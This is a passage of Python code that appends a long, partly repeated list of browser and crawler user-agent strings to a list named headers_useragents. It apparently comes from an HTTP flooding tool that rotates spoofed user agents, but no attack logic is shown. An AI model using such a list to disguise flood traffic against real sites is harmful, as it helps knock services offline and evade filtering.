	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
